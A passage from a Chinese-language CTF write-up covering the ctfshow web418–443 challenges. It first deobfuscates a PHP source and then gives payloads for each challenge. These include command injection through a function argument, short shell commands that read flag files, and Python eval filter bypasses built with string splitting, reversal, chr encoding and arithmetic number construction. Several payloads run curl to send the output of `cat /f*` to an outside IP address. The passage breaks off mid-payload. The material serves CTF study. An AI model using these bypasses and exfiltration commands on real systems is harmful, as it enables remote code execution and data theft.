dlS3ZieTJBZXgyZWR2R2V1ZlBtMWdQNVRmMWVCZmdFZXZlYzFlQ1NpaWVjcGdLOVVmUHRWZXV4U0ZxOXlpdTVTZTA1aWVna29mMUpqZ2h2aGVWdmd5aHhwU0poTXhWQXVuSlVJaTBTVGwxRWN5M2VhdjJ2MFBQQjRlZWNDVTJCaG5lVWtlcXhteUpCQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRpMmNZTHFBQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRncVNpdjJ2eXZLdHVlSzltZ3FTaUwxU1BMcXRlZlZCYml1SjF4MllXTHFoVEozeDNncVNpdjJ2eXZLdHVlSzltaTFTcExxOTNOZzBIYWl1N05JND0iO2V2YWwoJz8+Jy4kQ0JoU2Z3KCR4V29JVnkoJFJrRUV1VigkalhqdEtkLCRZRmZLclcqMiksJFJrRUV1VigkalhqdEtkLCRZRmZLclcsJFlGZktyVyksJFJrRUV1VigkalhqdEtkLDAsJFlGZktyVykpKSk7&quot;));\n不过看起来上了混淆（刚开始还以为是个webshell。。），得去一下混淆\nnnd，有套娃。。。\necho base64_decode(strtr(substr($NpmjHq, 52 * 2), substr($NpmjHq, 52, 52), substr($NpmjHq, 0, 52)));\n最终得到源码\n/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-26 20:52:23# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);include(&#x27;flag.php&#x27;);$c=$_GET[&#x27;ctf&#x27;];if($c==&#x27;show&#x27;)&#123;        echo $flag;&#125;else&#123;        echo &#x27;FLAG_NOT_HERE&#x27;;&#125;\nctf=show\n\nweb418 帮大黑阔写好后门\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-26 23:52:58# @email: h1xa@ctfer.com# @link: https://ctfer.com*/$key= 0;$clear=&#x27;clear.php&#x27;;highlight_file(__FILE__);//获取参数$ctfshow=$_GET[&#x27;ctfshow&#x27;];//包含清理脚本include($clear);extract($_POST);if($key===0x36d)&#123;    //帮黑阔写好后门    eval(&#x27;&lt;?php &#x27;.$ctfshow.&#x27;?&gt;&#x27;);&#125;else&#123;    $die?die(&#x27;FLAG_NOT_HERE&#x27;):clear($clear);&#125;\n首先由于这里是一个强类型比较，即使我们可以利用extract进行变量覆盖，也无法利用ctfshow这个变量进行RCE。所以下面就要考虑clear()函数，它看起来像是clear.php中的函数。其实 这里也没说明这个函数参数是咋用的，但是应该是有一个shell_exec作为sink。那么我们就可以利用管道符拼接那一套\nclear=;cp flag.php flag.txt \n但是注意我们要成功传入clear函数还需满足die变量值为0且key随便取\nkey=a&amp;die=0&amp;clear=;cp flag.php flag.txt\n\nweb419 想想办法\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-29 01:36:24# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);$code = $_POST[&#x27;code&#x27;];if(strlen($code) &lt; 17)&#123;    eval($code);&#125;Notice: Undefined index: code in /var/www/html/index.php on line 18\n这里可以执行任意代码，限制了长度不能超过16\n还是很充足的\ncode=echo `cat fl*`;\n\nweb420 想想办法\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-29 01:41:05# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);$code = $_POST[&#x27;code&#x27;];if(strlen($code) &lt; 8)&#123;    system($code);&#125;Notice: Undefined index: code in /var/www/html/index.php on line 18Warning: system(): Cannot execute a blank command in /var/www/html/index.php on line 20\n直接换成system了，不用我们自己回显\nenv\n不过发现flag不在根目录也不在当前目录了，不过发现在上一级，但是我们code最多7个字符，可以利用nl\nnl ../*\n\nweb421 想想办法\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-29 01:42:50# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);$code = $_POST[&#x27;code&#x27;];if(strlen($code) &lt; 6)&#123;    system($code);&#125;Notice: Undefined index: code in /var/www/html/index.php on line 18Warning: system(): Cannot execute a blank command in /var/www/html/index.php on line 20\n这次虽然限制到了5个字符，但是flag在当前目录了\nnl f*\n\nweb422 想想办法\n源码如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2021-01-25 23:07:21# @Last Modified by:   h1xa# @Last Modified time: 2021-01-29 01:42:50# @email: h1xa@ctfer.com# @link: https://ctfer.com*/highlight_file(__FILE__);$code = $_POST[&#x27;code&#x27;];if(strlen($code) &lt; 5)&#123;    system($code);&#125;Notice: Undefined index: code in /var/www/html/index.php on line 18Warning: system(): Cannot execute a blank command in /var/www/html/index.php on line 20\n秀啊，限制到4个字符了。不过nl是支持读多个文件的\nnl *\n\nweb423 想想办法\n源代码中提示/?code\n这题出的有点提示太少了，wp中有源码\nfrom flask import Flaskfrom flask import requestimport osapp = Flask(__name__)@app.route(&#x27;/&#x27;)def app_index():    code = request.args.get(&#x27;code&#x27;)    if code:    \treturn eval(code)    return &#x27;where is flag?&lt;!-- /?code --&gt;&#x27;if __name__==&quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;,port=80)\n题目导入了os模块，因此我们可以直接使用一些系统执行函数，比如os.popen()或者os.system()不过也可以直接调用读写文件函数\nopen(&#x27;/flag&#x27;).read()\n\nweb424 想想办法\n（去掉了os模块）没变化\n\nweb425 想想办法\n这道题实际上是过滤了os|popen，仍然没过滤open\n\nweb426 想想办法\n过滤os|popen\n\nweb427 想想办法\n过滤os|popen|system\n\nweb428 想想办法\n过滤os|popen|system|read，题出的有问题\n\nweb429 想想办法\n匹配正则时没有去掉前后的空格，因此还是\n&lt;space&gt;open(%27/flag%27).read()\n\nweb430 想想办法\n过滤os|open|system|read|eval\n\nweb431 想想办法\n过滤os|open|system|read|eval|str\n\nweb432 想想办法\n这关恢复正常了，过滤掉了os|open|system|read|eval\n这里可以利用模板注入的思路\n首先获取当前命名空间下所有内置函数的字典，可以通过str()来输出以便服务器回显\n__builtins__.__dict__\n\n\n\n可以看到我们是可以调用import模块的，我们导入os模块即\n__builtins__.__dict__[&#x27;__impor&#x27;%2b&#x27;t__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;)\n接着利用其命令执行函数system，绕过思路就是可以改成用魔术方法__getattribute__来使得方法用字符串的方式来调用\n__builtins__.__dict__[&#x27;__impor&#x27;%2b&#x27;t__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;sys&#x27;%2b&#x27;tem&#x27;)\n我们利用一个curl来外带数据即可\nstr(__builtins__.__dict__[&#x27;__impor&#x27;%2b&#x27;t__&#x27;](&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;sys&#x27;%2b&#x27;tem&#x27;)(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;))\n\n\nweb433 想想办法\n过滤os|open|system|read|eval|builtins\n直接调用__import__ 也是可以滴\nstr(__import__(&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;sys&#x27;%2b&#x27;tem&#x27;)(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;))\n\nweb434 想想办法\n这次过滤了os|open|system|read|eval|builtins|curl\n当然只要是字符串我们就可以通过拼接绕过\nstr(__import__(&#x27;o&#x27;%2b&#x27;s&#x27;).__getattribute__(&#x27;sys&#x27;%2b&#x27;tem&#x27;)(&#x27;cur&#x27;%2b&#x27;l http://43.140.198.45:5000/?flag=`cat /f*`&#x27;))\n\nweb435-439 想想办法\n这次过滤os|open|system|read|eval|builtins|curl|_\n这里学习一个新的命令执行函数exec（咋跟java那么像）\n\n\n\n这样就可以提供一个类似eval的函数，并且我们是可以执行多条python代码的（通过分号进行分割）\n而针对关键词的过滤这关我们换个方法，利用字符串反转\nstr(exec(&#x27;)&quot;`*f/ tac`=galf?/0005:54.891.041.34//:ptth lruc&quot;(metsys.so ;so tropmi&#x27;[::-1]))\n\n\nweb440 想想办法\n这关多过滤了引号，我们有内置函数chr()可以用，通过chr进行拼接\ndef cchr(s):    exp = &#x27;&#x27;    for i in range(len(s)):        if i &lt; len(s)-1:            exp += &#x27;chr(&#x27;+str(ord(s[i]))+&#x27;)%2b&#x27;        else:            exp += &#x27;chr(&#x27;+str(ord(s[i])) + &#x27;)&#x27;    return exppayload = &#x27;import os; os.system(&quot;curl http://43.140.198.45:5000/?flag=`cat /f*`&quot;)&#x27;print(cchr(payload))\npayload：\nstr(exec(chr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(32)%2bchr(111)%2bchr(115)%2bchr(59)%2bchr(32)%2bchr(111)%2bchr(115)%2bchr(46)%2bchr(115)%2bchr(121)%2bchr(115)%2bchr(116)%2bchr(101)%2bchr(109)%2bchr(40)%2bchr(34)%2bchr(99)%2bchr(117)%2bchr(114)%2bchr(108)%2bchr(32)%2bchr(104)%2bchr(116)%2bchr(116)%2bchr(112)%2bchr(58)%2bchr(47)%2bchr(47)%2bchr(52)%2bchr(51)%2bchr(46)%2bchr(49)%2bchr(52)%2bchr(48)%2bchr(46)%2bchr(49)%2bchr(57)%2bchr(56)%2bchr(46)%2bchr(52)%2bchr(53)%2bchr(58)%2bchr(53)%2bchr(48)%2bchr(48)%2bchr(48)%2bchr(47)%2bchr(63)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(61)%2bchr(96)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(42)%2bchr(96)%2bchr(34)%2bchr(41)))\n\nweb441 想想办法\n多过滤双引号，这里再复习一下ssti绕过思路中的request绕过，由于是代码执行，所以是可以直接调用request.args.get的\nstr(exec(request.args.get(chr(97))))&amp;a=__import__(&#x27;os&#x27;).system(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;)\n\nweb442 想想办法\n这关针对code变量过滤掉了数字，也就是chr没法直接用了。我们利用其的目的其实只是为了获取一个字符串用来充当传参变量名，所以找另外一个可以直接返回字符串的函数也是可以的，比如request.method就会返回GET字符串，而我们拿它当变量名就好了\nstr(exec(request.args.get(request.method)))&amp;GET=__import__(&#x27;os&#x27;).system(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;)\n\nweb443 想想办法，提交参数为POST\n这里的思路是构造数字，参考自偶像Y4tacker\n这里用的是一种递归式构造，对于最基本的数字，即-2,-1,0,1，我们即采用长度构造的方式\n0 -&gt; int(len(str()))1-&gt; int(len(str(None))/len(str(None)))\t0 的取反是 -11 的取反是 -2-1 -&gt; ~int(len(str()))-2 -&gt; ~int(len(str(None))/len(str(None)))\t\n而对于其他数字我们拆分成奇数和偶数，对于所有的奇数，都是可以通过取反一个小的数字来构造出的；而对于偶数，采用移位的方式&lt;&lt;，没除一次2，就移位1次\ndef getNumber(num):    number = int(num)    if number in [-2, 1, 0, 1]:        return [&quot;~int((len(str(None))/len(str(None))))&quot;, &quot;~int(len(str()))&quot;, &quot;int(len(str()))&quot;, &quot;int((len(str(None))/len(str(None))))&quot;][number+2]    if number % 2 == 1:        return &#x27;~%s&#x27; % getNumber(~number)    else:        return &#x27;(%s&lt;&lt;(int((len(str(None))/len(str(None))))))&#x27; % getNumber(number/2)payload = &quot;import os;os.system(&#x27;curl http://43.140.198.45:5000/?flag=`cat /f*`&#x27;)&quot;exp = &#x27;str().join([&#x27;for i in payload:    exp += f&quot;chr(&#123;getNumber(ord(i))&#125;),&quot;exp = exp[:-1]  # 去掉最后一个&#x27;,&#x27;exp += &#x27;])&#x27;print(exp)\npayload:\nstr().join([chr(~(~((~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((((int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~((~(((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~(~((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((~(~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(((~((int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~(((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~((~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((((int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((~((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((((~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr((~(~(~((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(~(~(~(~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(((((~(~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~((((~(int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None))))))),chr(~(((((~int((len(str(None))/len(str(None))))&lt;&lt;(int((len(str(None))/len(str(None))))))&lt;&lt;(int((len(str(None))/len(str(None)))))